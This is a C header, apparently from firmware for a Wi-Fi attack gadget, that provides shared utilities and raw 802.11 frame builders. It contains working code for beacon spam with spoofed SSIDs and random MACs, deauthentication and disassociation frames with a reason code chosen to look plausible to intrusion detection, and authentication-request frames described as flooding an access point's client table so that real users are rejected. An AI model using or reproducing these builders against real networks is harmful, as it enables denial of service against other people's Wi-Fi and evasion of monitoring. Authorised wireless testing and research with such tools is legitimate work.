#pragma once
/*
 * wifi_common.h - Shared types, frame builders, and utilities for wifi apps.
 *
 * Include bs_wifi.h first so BS_HAS_WIFI is defined before we test it.
 */
#include "bs/bs_wifi.h"   /* defines BS_HAS_WIFI when a backend is selected */
#ifdef BS_HAS_WIFI

#include <stdint.h>
#include <stdbool.h>
#include <stddef.h>
#include <string.h>
#include "bs/bs_wifi.h"

/* ── AP list entry (scan results + selection state) ──────────────────────── */

#define WIFI_MAX_APS  32

typedef struct {
    bs_wifi_ap_t ap;
    bool         selected;
} wifi_ap_entry_t;

/* ── Client list entry (sniffed stations + selection state) ─────────────── */

#define WIFI_MAX_CLIENTS 32

typedef struct {
    uint8_t mac[6];
    bool    selected;
} wifi_client_entry_t;

/* ── PPS / throughput counter ───────────────────────────────────────────── */

typedef struct {
    uint32_t total;
    uint32_t last_sec_count;
    uint32_t last_tick_ms;
    uint32_t pps;
} wifi_pps_t;

static inline void wifi_pps_init(wifi_pps_t* p) {
    p->total = p->last_sec_count = p->last_tick_ms = p->pps = 0;
}

/* Call once per transmitted/received frame; updates pps once per second. */
static inline void wifi_pps_tick(wifi_pps_t* p, uint32_t now_ms) {
    p->total++;
    p->last_sec_count++;
    uint32_t elapsed = now_ms - p->last_tick_ms;
    if (elapsed >= 1000) {
        p->pps = p->last_sec_count * 1000 / (elapsed ? elapsed : 1);
        p->last_sec_count = 0;
        p->last_tick_ms   = now_ms;
    }
}

/* ── LCG PRNG ────────────────────────────────────────────────────────────── */

typedef uint32_t wifi_prng_t;

static inline void wifi_prng_seed(wifi_prng_t* s, uint32_t seed) { *s = seed; }

static inline uint32_t wifi_prng_next(wifi_prng_t* s) {
    *s = *s * 1664525u + 1013904223u;   /* Knuth LCG constants */
    return *s;
}

static inline void wifi_prng_bytes(wifi_prng_t* s, uint8_t* buf, size_t len) {
    for (size_t i = 0; i < len; i++) {
        if ((i & 3) == 0) wifi_prng_next(s);
        buf[i] = (uint8_t)(*s >> (8 * (i & 3)));
    }
}

/* ── Random locally-administered MAC ────────────────────────────────────── */

static inline void wifi_random_mac(wifi_prng_t* s, uint8_t mac[6]) {
    wifi_prng_bytes(s, mac, 6);
    mac[0] = (mac[0] & 0xFE) | 0x02;   /* unicast, locally administered */
}

/* ── 802.11 beacon frame builder ─────────────────────────────────────────── */

/* Builds a minimal beacon into buf (>= 128 bytes); returns frame length.
 * Layout: 24B MAC header | 12B fixed fields | SSID IE | Rates IE | DS IE   */
static inline int wifi_build_beacon(uint8_t* buf, size_t buf_size,
                                    const char* ssid,
                                    const uint8_t bssid[6],
                                    uint8_t channel) {
    const uint8_t broadcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
    uint8_t ssid_len = 0;
    while (ssid && ssid[ssid_len] && ssid_len < 32) ssid_len++;

    size_t needed = 24 + 12 + 2 + ssid_len + 10 + 3;
    if (buf_size < needed) return -1;

    uint8_t* p = buf;

    /* --- MAC header --- */
    *p++ = 0x80; *p++ = 0x00;                  /* FC: beacon            */
    *p++ = 0x00; *p++ = 0x00;                  /* Duration              */
    for (int i = 0; i < 6; i++) *p++ = broadcast[i]; /* DA: broadcast   */
    for (int i = 0; i < 6; i++) *p++ = bssid[i];     /* SA = BSSID      */
    for (int i = 0; i < 6; i++) *p++ = bssid[i];     /* BSSID           */
    *p++ = 0x00; *p++ = 0x00;                  /* Seq-ctrl (0)          */

    /* --- Fixed beacon fields --- */
    for (int i = 0; i < 8; i++) *p++ = 0x00;  /* Timestamp             */
    *p++ = 0x64; *p++ = 0x00;                  /* Beacon interval 100TU */
    *p++ = 0x01; *p++ = 0x04;                  /* Capability: ESS+Privacy*/

    /* --- SSID IE (tag 0) --- */
    *p++ = 0x00;
    *p++ = ssid_len;
    for (int i = 0; i < ssid_len; i++) *p++ = (uint8_t)ssid[i];

    /* --- Supported Rates IE (tag 1) --- */
    *p++ = 0x01; *p++ = 0x08;
    *p++ = 0x82; *p++ = 0x84; *p++ = 0x8B; *p++ = 0x96;  /* 1,2,5.5,11 Mbps */
    *p++ = 0x0C; *p++ = 0x12; *p++ = 0x24; *p++ = 0x48;  /* 6,9,18,36 Mbps  */

    /* --- DS Parameter Set IE (tag 3) --- */
    *p++ = 0x03; *p++ = 0x01; *p++ = channel;

    return (int)(p - buf);
}

/* ── 802.11 deauth / disassoc frame builders ─────────────────────────────── */

#define DEAUTH_FRAME_LEN 26   /* deauth and disassoc are the same length */

/*
 * Builds a deauthentication frame (subtype 0xC0) into buf.
 * reason 7 = Class 3 frame from nonassociated STA (plausible vs WIDS).
 */
static inline int wifi_build_deauth(uint8_t* buf,
                                    const uint8_t dst[6],
                                    const uint8_t src[6],
                                    const uint8_t bssid[6],
                                    uint16_t reason) {
    uint8_t* p = buf;
    *p++ = 0xC0; *p++ = 0x00;      /* FC: deauth (subtype 12)        */
    *p++ = 0x00; *p++ = 0x00;      /* Duration                       */
    for (int i = 0; i < 6; i++) *p++ = dst[i];
    for (int i = 0; i < 6; i++) *p++ = src[i];
    for (int i = 0; i < 6; i++) *p++ = bssid[i];
    *p++ = 0x00; *p++ = 0x00;      /* Seq-ctrl                       */
    *p++ = (uint8_t)(reason & 0xFF);
    *p++ = (uint8_t)(reason >> 8);
    return DEAUTH_FRAME_LEN;
}

/* Disassoc transitions the client to state 2 (authenticated, not associated)
 * rather than state 1; complements deauth on non-PMF networks.             */
static inline int wifi_build_disassoc(uint8_t* buf,
                                      const uint8_t dst[6],
                                      const uint8_t src[6],
                                      const uint8_t bssid[6],
                                      uint16_t reason) {
    uint8_t* p = buf;
    *p++ = 0xA0; *p++ = 0x00;      /* FC: disassoc (subtype 10)      */
    *p++ = 0x00; *p++ = 0x00;
    for (int i = 0; i < 6; i++) *p++ = dst[i];
    for (int i = 0; i < 6; i++) *p++ = src[i];
    for (int i = 0; i < 6; i++) *p++ = bssid[i];
    *p++ = 0x00; *p++ = 0x00;
    *p++ = (uint8_t)(reason & 0xFF);
    *p++ = (uint8_t)(reason >> 8);
    return DEAUTH_FRAME_LEN;
}

/* Auth request (Open System, seq 1) for AID-table flooding.
 * Each request consumes an AP AID slot (32–2048); full table = real clients
 * rejected.  Effective regardless of PMF (pre-auth has no MIC protection). */
#define AUTH_FRAME_LEN 30

static inline int wifi_build_auth_req(uint8_t* buf,
                                      const uint8_t ap_bssid[6],
                                      const uint8_t src_mac[6]) {
    uint8_t* p = buf;
    *p++ = 0xB0; *p++ = 0x00;      /* FC: authentication (subtype 11) */
    *p++ = 0x00; *p++ = 0x00;      /* Duration                        */
    for (int i = 0; i < 6; i++) *p++ = ap_bssid[i];  /* Addr1 = AP    */
    for (int i = 0; i < 6; i++) *p++ = src_mac[i];   /* Addr2 = spoof */
    for (int i = 0; i < 6; i++) *p++ = ap_bssid[i];  /* Addr3 = BSSID */
    *p++ = 0x00; *p++ = 0x00;      /* Seq-ctrl                        */
    *p++ = 0x00; *p++ = 0x00;      /* Auth Algorithm: Open System     */
    *p++ = 0x01; *p++ = 0x00;      /* Auth Transaction Seq: 1 (req)   */
    *p++ = 0x00; *p++ = 0x00;      /* Status Code: 0 (reserved/OK)    */
    return AUTH_FRAME_LEN;
}

/* ── ASCII word list (RANDOM mode default charset) ───────────────────────── */

static const char* const k_wifi_words[] = {
    "FBI_Surveillance", "CIA_Mobile", "NSA_Drone",
    "Not_Your_Wifi",    "Pretty_Fly",  "HideYoKids",
    "TellMyWifi_LoveHer", "Loading...", "Searching...",
    "Error_404",        "Bill_Wi",     "Wu_Tang_LAN",
    "Winternet_Is_Coming", "YellForPassword", "TheLAN_Before_Time",
    "SkyNet_Online",    "Virus_Infected", "Hack_The_Planet",
    "HostileHotspot",   "MomsSpagetti",   "FreeWifi_Trojan",
    "DeepPacketInspection", "PleaseConnectMe", "NothingToSeeHere",
};
#define WIFI_WORDS_COUNT (int)(sizeof(k_wifi_words)/sizeof(k_wifi_words[0]))

static inline const char* wifi_random_ssid(wifi_prng_t* s) {
    return k_wifi_words[wifi_prng_next(s) % (uint32_t)WIFI_WORDS_COUNT];
}

/* ── Unicode charset tables (UTF-8 multi-byte chars) ────────────────────── */
/*
 * Beacon SSIDs are raw bytes — clients render them as UTF-8 if they support it.
 * Hiragana/Katakana = 3 bytes per char (U+3040-U+30FF range).
 * Cyrillic          = 2 bytes per char (U+0400-U+04FF range).
 */

typedef enum {
    WIFI_CHARSET_ASCII    = 0,
    WIFI_CHARSET_HIRAGANA = 1,
    WIFI_CHARSET_KATAKANA = 2,
    WIFI_CHARSET_CYRILLIC = 3,
    WIFI_CHARSET_COUNT    = 4,
} wifi_charset_t;

static const char* const k_wifi_charset_names[] = {
    "ASCII", "HIRAGANA", "KATAKANA", "CYRILLIC"
};

static const char* const k_hiragana[] = {
    "\xe3\x81\x82", "\xe3\x81\x84", "\xe3\x81\x86", "\xe3\x81\x88", "\xe3\x81\x8a",  /* あいうえお */
    "\xe3\x81\x8b", "\xe3\x81\x8d", "\xe3\x81\x8f", "\xe3\x81\x91", "\xe3\x81\x93",  /* かきくけこ */
    "\xe3\x81\x95", "\xe3\x81\x97", "\xe3\x81\x99", "\xe3\x81\x9b", "\xe3\x81\x9d",  /* さしすせそ */
    "\xe3\x81\x9f", "\xe3\x81\xa1", "\xe3\x81\xa4", "\xe3\x81\xa6", "\xe3\x81\xa8",  /* たちつてと */
};
#define HIRAGANA_COUNT 20

static const char* const k_katakana[] = {
    "\xe3\x82\xa2", "\xe3\x82\xa4", "\xe3\x82\xa6", "\xe3\x82\xa8", "\xe3\x82\xaa",  /* アイウエオ */
    "\xe3\x82\xab", "\xe3\x82\xad", "\xe3\x82\xaf", "\xe3\x82\xb1", "\xe3\x82\xb3",  /* カキクケコ */
    "\xe3\x82\xb5", "\xe3\x82\xb7", "\xe3\x82\xb9", "\xe3\x82\xbb", "\xe3\x82\xbd",  /* サシスセソ */
    "\xe3\x82\xbf", "\xe3\x83\x81", "\xe3\x83\x84", "\xe3\x83\x86", "\xe3\x83\x88",  /* タチツテト */
};
#define KATAKANA_COUNT 20

static const char* const k_cyrillic[] = {
    "\xd0\x90", "\xd0\x91", "\xd0\x92", "\xd0\x93", "\xd0\x94",  /* А Б В Г Д */
    "\xd0\x95", "\xd0\x96", "\xd0\x97", "\xd0\x98", "\xd0\x99",  /* Е Ж З И Й */
    "\xd0\x9a", "\xd0\x9b", "\xd0\x9c", "\xd0\x9d", "\xd0\x9e",  /* К Л М Н О */
    "\xd0\x9f", "\xd0\xa0", "\xd0\xa1", "\xd0\xa2", "\xd0\xa3",  /* П Р С Т У */
    "\xd0\xa4", "\xd0\xa5", "\xd0\xa6", "\xd0\xa7", "\xd0\xa8",  /* Ф Х Ц Ч Ш */
    "\xd0\xa9", "\xd0\xad", "\xd0\xae", "\xd0\xaf",              /* Щ Э Ю Я   */
};
#define CYRILLIC_COUNT 29

/*
 * Generate a random SSID using the specified charset into buf (>= 33 bytes).
 * For multi-byte charsets: picks 8 characters, capped at 32 bytes total.
 */
static inline void wifi_random_ssid_charset(wifi_prng_t* s,
                                            wifi_charset_t charset,
                                            char* buf, int buf_size) {
    if (charset == WIFI_CHARSET_ASCII) {
        strncpy(buf, wifi_random_ssid(s), (size_t)(buf_size - 1));
        buf[buf_size - 1] = '\0';
        return;
    }

    const char* const* chars;
    int count, char_bytes;
    switch (charset) {
        case WIFI_CHARSET_HIRAGANA:
            chars = k_hiragana; count = HIRAGANA_COUNT; char_bytes = 3; break;
        case WIFI_CHARSET_KATAKANA:
            chars = k_katakana; count = KATAKANA_COUNT; char_bytes = 3; break;
        case WIFI_CHARSET_CYRILLIC:
        default:
            chars = k_cyrillic; count = CYRILLIC_COUNT; char_bytes = 2; break;
    }

    int max_chars = 32 / char_bytes;          /* how many fit in 32-byte SSID */
    int n = 8; if (n > max_chars) n = max_chars;

    int pos = 0;
    for (int i = 0; i < n; i++) {
        int idx = (int)(wifi_prng_next(s) % (uint32_t)count);
        if (pos + char_bytes >= buf_size) break;
        for (int b = 0; b < char_bytes; b++)
            buf[pos++] = chars[idx][b];
    }
    buf[pos] = '\0';
}

#endif /* BS_HAS_WIFI */
